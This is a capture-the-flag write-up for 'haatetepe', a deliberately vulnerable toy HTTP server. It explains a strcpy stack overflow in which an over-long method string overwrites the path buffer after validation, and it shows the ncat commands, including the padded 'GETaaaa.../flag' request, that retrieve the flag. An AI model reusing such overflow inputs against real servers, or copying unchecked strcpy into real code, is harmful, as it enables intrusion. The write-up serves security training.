# haatetepe

- Author: fslaktern
- Category: pwn
- Difficulty: easy
- Description:

    The best haatetepe server in Norway comes with speed, small size and modular routing. I've disabled the /flag route for now, though. Check out the server and let me know what you think! I haven't done any benchmarks, but I bet it's faster than NGINX, and it uses less than 1MB memory!

    It's in its (very) early stages, but I'm planning on implementing the rest of the HTTP header specification when I get time. Thanks for stopping by!


## Vulnerability

- Use of insecure `strcpy` to set request method. This can overflow the next variable on the stack, which is `path`.

## Exploit


- Stack overflow in method string sets path to illegal path `/flag` after path validation

``` sh
echo "GET / HTTP/1.1" | ncat --ssl 26b908f8-e830-43cb-83c6-e0d25f09273d.chall.nnsc.tf 41337
< HTTP/1.1 200 OK
< Content-Length: 32
< Content-Type: text/plain
< 
< Welcome to haatetepe, not nginx!

echo "GETaaaaaaaaaaaaa/flag / HTTP/1.1" | ncat --ssl 26b908f8-e830-43cb-83c6-e0d25f09273d.chall.nnsc.tf 41337
< HTTP/1.1 200 OK
< Content-Length: 151
< Content-Type: text/plain
< 
< Well of course you can have the flag! All you have to do is ask.
< Flag: NNS{wh4t_d0_y0u_m34n_my_53rv3r_15n7_s3cur3?_4nd_n0_1_w0n7_u53_Rust_58b83a159f28}⏎               
```
